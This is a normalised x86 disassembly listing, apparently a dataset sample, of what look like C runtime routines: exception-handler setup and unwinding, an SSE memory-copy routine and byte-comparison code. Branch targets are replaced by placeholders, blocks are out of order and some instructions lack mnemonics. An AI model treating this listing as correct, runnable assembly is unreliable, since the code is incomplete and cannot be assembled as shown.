test ecx 0xffffff00
jne r-xdata
jmp r-xdata
cmp ecx 0x20
jb r-xdata
sub_41138a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
cmp eax ecx
jne r-xdata
add ecx 0x5
add eax 0x5
xor eax eax
pop ebp
retn
sbb eax eax
or eax 0x1
pop ebp
retn
test dl dl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
jmp r-xdata
sub_4113c6
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
lea ecx [ ebp - 0x18 ]
and [ ebp - 0x18 ] 0x0
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_411602
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_4135c0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_411426
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_4116c7
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_4134cc
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call [ r--data ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x4 ]
pop ecx
pop ecx
and [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
sub_411503
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx ecx
mov ebx [ edi + 0x10 ]
mov [ ebp - 0x4 ] ecx
test esi esi
js r-xdata
mov eax [ ebp + 0x14 ]
inc ecx
mov [ eax ] ecx
mov eax [ ebp + 0x18 ]
mov [ eax ] edx
cmp edx [ edi + 0xc ]
ja r-xdata
imul eax ecx 0x14
add eax 0x8
add eax ebx
call sub_4190e7
cmp ecx edx
ja r-xdata
mov edi [ ebp + 0x10 ]
sub eax 0x14
dec ecx
cmp [ eax - 0x4 ] edi
mov edi [ ebp + 0x8 ]
jge r-xdata
imul eax ecx 0x14
pop edi
pop esi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi [ eax ]
mov edi [ ebp + 0x8 ]
jle r-xdata
test esi esi
jns r-xdata
mov edx [ ebp - 0x4 ]
dec esi
mov [ ebp - 0x4 ] ecx
cmp ecx 0xffffffff
je r-xdata
sub_41157b
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_4115ad
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411602
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40d56a
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_4101e2
add esp 0x20
pop esi
pop ebp
retn
sub_411633
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_4134cc
mov ecx [ eax + 0x24 ]
mov [ esi + 0x4 ] ecx
call sub_4134cc
mov [ eax + 0x24 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_411657
push ebp
mov ebp esp
push esi
call sub_4134cc
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x24 ]
jne r-xdata
call sub_4134cc
mov ecx [ eax + 0x24 ]
jmp r-xdata
call sub_4134cc
lea ecx [ eax + 0x24 ]
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
call sub_4190e7
pop esi
pop ebp
retn
sub_4116a1
push ebp
mov ebp esp
call sub_4134cc
mov eax [ eax + 0x24 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_4116c7
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40d56a
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_4101e2
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_411426
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4115ad
pop ebx
mov esp ebp
pop ebp
retn
sub_411766
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4101e2
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4117a0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x20
jb r-xdata
cmp edi eax
jb r-xdata
and ecx 0x1f
je r-xdata
cmp ecx 0x80
jae r-xdata
lea esi [ ecx + esi ]
lea edi [ ecx + edi ]
cmp ecx 0x20
jb r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax ecx
shr ecx 0x2
je r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
test ecx 0xfffffffc
je r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
add edi 0x4
add esi 0x4
sub ecx 0x1
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test ecx ecx
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
sub edi 0x4
sub esi 0x4
mov eax [ esi ]
mov [ edi ] eax
sub ecx 0x4
test ecx 0xfffffffc
jne r-xdata
test edi 0xf
je r-xdata
test edi 0x3
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov edx ecx
shr edx 0x5
test edx edx
je r-xdata
test edi 0x3
je r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
sub edi 0x1
sub esi 0x1
mov al [ esi ]
mov [ edi ] al
sub ecx 0x1
jne r-xdata
cmp ecx 0x80
jb r-xdata
dec ecx
dec esi
dec edi
mov al [ esi ]
mov [ edi ] al
test edi 0xf
jne r-xdata
cmp ecx 0x20
jb r-xdata
mov edx edi
and edx 0x3
sub ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
test edi 0x3
jne r-xdata
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
cmp ecx 0x20
jb r-xdata
mov al [ esi ]
mov [ edi ] al
dec ecx
add esi 0x1
add edi 0x1
test edi 0x3
jne r-xdata
cmp ecx 0x20
jb r-xdata
sub esi 0x80
sub edi 0x80
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu xmm2 [ esi + 0x20 ]
movdqu xmm3 [ esi + 0x30 ]
movdqu xmm4 [ esi + 0x40 ]
movdqu xmm5 [ esi + 0x50 ]
movdqu xmm6 [ esi + 0x60 ]
movdqu xmm7 [ esi + 0x70 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
movdqu [ edi + 0x20 ] xmm2
movdqu [ edi + 0x30 ] xmm3
movdqu [ edi + 0x40 ] xmm4
movdqu [ edi + 0x50 ] xmm5
movdqu [ edi + 0x60 ] xmm6
movdqu [ edi + 0x70 ] xmm7
sub ecx 0x80
test ecx 0xffffff80
jne r-xdata
mov edx ecx
shr ecx 0x2
and edx 0x3
sub esi 0x4
sub edi 0x4
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + r-xdata ]
mov al [ esi - 0x1 ]
mov [ edi - 0x1 ] al
dec esi
dec edi
sub edx 0x1
jne r-xdata
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
lea esi [ esi + 0x20 ]
lea edi [ edi + 0x20 ]
dec edx
jne r-xdata
shr ecx 0x2
[ edi ] [ esi ]
and edx 0x3
jmp [ edx * 4 + r-xdata ]
sub esi 0x20
sub edi 0x20
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
sub ecx 0x20
test ecx 0xffffffe0
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
lea esp [ esp ]
mov edi edi
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov edi edi
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + r-xdata ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_411d14
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax ebx
push esi
sub eax 0x0
je r-xdata
xor eax eax
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
jmp r-xdata
sub eax 0x1
je r-xdata
sub ecx eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
sub eax 0x1
je r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
mov edx [ ebp + 0xc ]
sub eax 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub esi eax
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x20
jb r-xdata
movzx ecx [ edx + 0x2 ]
movzx eax [ esi + 0x2 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
add esi ebx
add edx ebx
cmp ebx 0x1f
ja r-xdata
mov eax [ esi ]
cmp eax [ edx ]
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
jmp [ ebx * 4 + jump_table_413414 ]
xor ecx ecx
movzx edi al
movzx eax [ edx ]
sub edi eax
je r-xdata
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ esi - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ esi - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ esi - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ esi - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ esi - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ esi - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ esi - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ esi - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ esi - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ esi - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ esi - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ esi - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ esi - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ edx - 0x1 ]
movzx ecx [ esi - 0x1 ]
sub ecx eax
je r-xdata
mov eax [ esi - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ esi - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ esi - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ esi - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ esi - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ esi - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ esi - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ esi - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ esi - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ esi - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ esi - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ esi - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ esi - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ esi - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ esi - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
mov eax ecx
pop edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx edi [ esi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xc ]
movzx edi [ esi - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xa ]
movzx edi [ esi - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
jmp r-xdata
xor ecx ecx
movzx eax [ edx - 0x1f ]
movzx edi [ esi - 0x1f ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xf ]
movzx edi [ esi - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
movzx eax [ edx - 0x2 ]
movzx edi [ esi - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x4 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
